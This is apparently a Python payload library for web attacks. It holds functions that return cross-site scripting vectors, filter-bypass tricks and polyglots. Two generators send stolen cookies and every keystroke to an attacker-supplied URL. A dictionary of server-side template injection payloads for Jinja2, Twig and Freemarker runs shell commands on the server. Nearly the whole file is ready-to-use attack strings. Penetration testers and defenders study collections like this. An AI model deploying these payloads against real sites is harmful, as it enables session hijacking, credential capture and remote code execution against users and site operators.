"""
XSS Payloads

Collection of Cross-Site Scripting payloads for various contexts.
"""

from typing import List


def xss_basic() -> List[str]:
    """Basic XSS payloads."""
    return [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">",
        "<a href=\"javascript:alert(1)\">click</a>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<math><maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert(1)\">click",
    ]


def xss_filter_bypass() -> List[str]:
    """XSS payloads to bypass common filters."""
    return [
        # Case variations
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",

        # No parentheses
        "<script>alert`1`</script>",
        "<img src=x onerror=alert`1`>",

        # HTML entities
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)\">click</a>",

        # URL encoding
        "<a href=\"javascript:%61lert(1)\">click</a>",

        # Unicode
        "<script>\\u0061lert(1)</script>",

        # Without script tag
        "<img src=x onerror=\"alert(1)\">",
        "<svg/onload=alert(1)>",
        "<body/onload=alert(1)>",

        # Event handlers
        "<div onmouseover=\"alert(1)\">hover me</div>",
        "<input type=text onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",

        # Exotic vectors
        "<math><brute href=\"javascript:alert(1)\">click",
        "<table background=\"javascript:alert(1)\">",
        "<object data=\"javascript:alert(1)\">",
        "<isindex action=\"javascript:alert(1)\">",

        # Breaking out of attributes
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "' onfocus=alert(1) autofocus='",

        # SVG vectors
        "<svg><script>alert(1)</script></svg>",
        "<svg onload=alert(1)//",
        "<svg/onload=alert(1)>",

        # Breaking out of JavaScript
        "</script><script>alert(1)</script>",
        "'-alert(1)-'",
        "\";alert(1)//",
    ]


def xss_cookie_steal(attacker_url: str) -> List[str]:
    """
    XSS payloads to steal cookies.

    Args:
        attacker_url: URL to send stolen cookies to

    Returns:
        List of cookie-stealing payloads
    """
    return [
        f"<script>new Image().src='{attacker_url}?c='+document.cookie</script>",
        f"<script>fetch('{attacker_url}?c='+document.cookie)</script>",
        f"<img src=x onerror=\"new Image().src='{attacker_url}?c='+document.cookie\">",
        f"<script>location='{attacker_url}?c='+document.cookie</script>",
        f"<script>document.location='{attacker_url}?c='+encodeURIComponent(document.cookie)</script>",
        f"<svg onload=\"fetch('{attacker_url}?c='+document.cookie)\">",
    ]


def xss_keylogger(attacker_url: str) -> str:
    """
    XSS payload to log keystrokes.

    Args:
        attacker_url: URL to send keystrokes to

    Returns:
        Keylogger payload
    """
    return f"""<script>
document.onkeypress=function(e){{
    new Image().src='{attacker_url}?k='+e.key;
}};
</script>"""


def xss_dom_payloads() -> List[str]:
    """DOM-based XSS payloads."""
    return [
        "#<script>alert(1)</script>",
        "#<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ]


def xss_polyglot() -> List[str]:
    """XSS polyglot payloads that work in multiple contexts."""
    return [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "'\"--></style></script><script>alert(1)</script>",
        "';alert(1);//",
        "\"onmouseover=alert(1)//",
        "\"autofocus onfocus=alert(1)//",
    ]


# SSTI (Server-Side Template Injection) payloads
SSTI_PAYLOADS = {
    "detection": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "@(7*7)",
        "{{7*'7'}}",
    ],
    "jinja2": [
        "{{config}}",
        "{{config.items()}}",
        "{{self.__class__.__mro__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ],
    "twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
    ],
    "freemarker": [
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    ],
}


if __name__ == "__main__":
    print("Basic XSS payloads:")
    for p in xss_basic()[:5]:
        print(f"  {p}")

    print("\nFilter bypass payloads:")
    for p in xss_filter_bypass()[:5]:
        print(f"  {p}")

    print("\nSSTI detection payloads:")
    for p in SSTI_PAYLOADS["detection"]:
        print(f"  {p}")
